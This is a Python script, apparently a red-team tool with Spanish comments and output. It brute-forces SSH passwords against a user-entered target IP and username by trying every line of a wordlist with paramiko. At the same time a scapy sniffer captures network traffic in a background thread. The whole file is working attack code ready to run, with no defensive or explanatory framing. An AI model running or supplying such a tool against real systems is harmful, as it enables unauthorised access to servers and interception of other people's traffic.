import paramiko
import socket
import time
import threading
from scapy.all import sniff

def process_packet(packet):
    """Función que se ejecuta cada vez que se intercepta un paquete en la red."""
    print(f" Tráfico interceptado: {packet.summary()}")

def start_sniffer():
    """Ejecuta el sniffer en segundo plano para capturar tráfico de forma continua."""
    try:
        sniff(prn=process_packet, store=0)
    except Exception as e:
        print(f"[-] Error en el sniffer: {e}")

def ataque_fuerzabruta_ssh(IP, usuario, archivo_contraseñas):
    print(f"\n Iniciando ataque de fuerza bruta SSH en {IP} con el usuario '{usuario}'")

    try:
        with open(archivo_contraseñas, 'r', encoding='utf-8') as archivo:
            for lineas in archivo:
                contraseña = lineas.strip()
                if not contraseña:
                    continue
                
                # Instancia limpia por cada intento para evitar conflictos de socket cerrado
                cliente = paramiko.SSHClient()
                cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                try:
                    print(f"Probando contraseña: {contraseña}")
                    cliente.connect(IP, username=usuario, password=contraseña, timeout=3)
                    print(f"\n ¡Contraseña Encontrada!: {contraseña}")
                    cliente.close()
                    return contraseña
                except paramiko.AuthenticationException:
                    pass
                except socket.timeout:
                    print(f"Conexión agotada para {IP}")
                except Exception as e:
                    print(f"Error de conexión: {e}")
                finally:
                    try:
                        cliente.close()
                    except:
                        pass
                
                # Pequeña pausa para no saturar el servicio SSH
                time.sleep(0.5)

        print("[*] Ataque finalizado. No se encontró la contraseña")
    except FileNotFoundError:
        print(f"[-] No se encontró el archivo en la ruta: {archivo_contraseñas}")

if __name__ == "__main__":
    print(" ")
    print("   RED TEAM - SSH Ataque de fuerza bruta fuerte y Captura de tráfico")
    print(" ")
    
    targetIP = input("Ingrese la IP objetivo: ")
    targetusuario = input("Ingrese el nombre de usuario objetivo: ")
    archivo = input("Ingrese la ruta completa donde está el archivo con las contraseñas: ")

    print("\n Iniciando sniffer de red en segundo plano...")
    
    # 1. Creamos y lanzamos el sniffer en un hilo secundario (background)
    hilo_sniffer = threading.Thread(target=start_sniffer, daemon=True)
    hilo_sniffer.start()

    time.sleep(1) # Breve pausa para asegurar que el sniffer arranque antes del ataque

    try:
        # 2. Ejecutamos el ataque de fuerza bruta SSH
        ataque_fuerzabruta_ssh(targetIP, targetusuario, archivo)
    except KeyboardInterrupt:
        print("\n El ataque y la captura se detuvieron correctamente por el usuario.")
